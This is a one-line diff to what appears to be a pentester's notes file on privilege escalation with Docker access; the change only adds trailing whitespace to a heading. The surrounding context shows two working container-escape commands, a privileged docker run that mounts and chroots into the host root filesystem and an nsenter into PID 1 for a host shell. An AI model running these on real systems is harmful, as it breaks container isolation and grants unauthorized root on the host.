@@ -29,7 +29,7 @@ Privesc with Docker access
 		mount host filesystems into a container - can be used to modify system files
 			docker run -it --privileged --net=host --pid=host --ipc=host --volume /:/host <image_name> chroot /host
 
-	Get root on a host from a root user on a container
+	Get root on a host from a root user on a container 
 		Execute shell in PID 1 namespace
 			nsenter --target 1 --mount sh
 
